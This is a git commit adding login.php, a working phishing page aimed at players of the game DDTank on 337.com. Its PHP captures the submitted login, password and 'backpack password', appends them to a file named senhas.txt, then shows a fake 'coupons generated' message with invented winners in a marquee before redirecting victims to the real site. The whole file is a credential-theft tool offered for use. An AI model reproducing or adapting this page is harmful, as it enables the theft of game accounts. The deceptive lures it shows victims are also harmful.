a32db51b5de2c569ee5f5293b80f618a77388a63
Evandro M Sousa <oievandrosousa@gmail.com>
2020-09-20 13:12:13 -0300

    primeiro commit

---
+++ login.php
@@ -0,0 +1,65 @@
+<?php
+$login = $_POST['login']; // ID do formulário de login
+$senha = $_POST['senha']; // ID do formulário de senha
+$senhamochila = $_POST['senham'];
+$all = "Login: ".$login."\nSenha: ".$senha."\n Senha da mochila: ".$senhamochila."\n\n";
+
+
+ 
+$fp = fopen("senhas.txt", "a");
+fwrite($fp, $all);
+fclose($fp);
+?>
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta http-equiv="refresh" content="5; url=http://www.337.com/pt/ddtank/">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="style.css">
+    <title>Gerador de Cupons</title>
+    <link href="https://fonts.googleapis.com/css2?family=Grandstander:wght@700&display=swap" rel="stylesheet">
+
+</head>
+<body>
+   <div class="centralizar">
+     <div class="head">
+        <img id="logo" src="images/logo.png"/>
+     
+        
+            
+            <div class="box-frente">
+                
+                <img id="certo" src="./images/certo.png" alt="">                
+                <p>Seus cupons foram gerados com sucesso! por favor aguarde de 2 a 4 horas para seus cupons chegarem</p>
+                <p>Temos um robô de analise de conta, o bug não funciona em conta fake!</p>
+                <p>Você será redirecionado para o site oficial do 337</p>
+            </div>
+                        
+           
+     </div><!---head-->   
+    </div><!---Centralizar-->
+
+    <div class="imagems">
+        <img src="./images/rec.png" id="rec" alt="">        
+    </div>
+
+    <div class="banner">
+        <div class="image">
+            
+         </div>
+        <marquee> 
+            <p>𝑷𝒍𝒂𝒚𝒃𝒐𝒚 recebeu 10.000 cupons - BoBMaRlEy recebeu 5.000 cupons, 𝔰𝔦𝔫𝔦𝔫𝔥0 recebeu 10.000 cupons - 𝖑𝖊𝖙𝖎𝖈𝖎𝖆 recebeu 2.000 cupons - Ⓙⓐⓒⓚⓢⓟⓐⓡⓡⓞⓦ recebeu 3.000 cupons</p>
+        </marquee>
+    </div>
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.1/jquery.min.js"></script>   
+    <script>
+        $(document).ready(function () {
+    $('input[type=radio]').change(function() {
+        $('input[type=radio]:checked').not(this).prop('checked', false);
+    });
+});
+    </script>
+</body>
+</html>
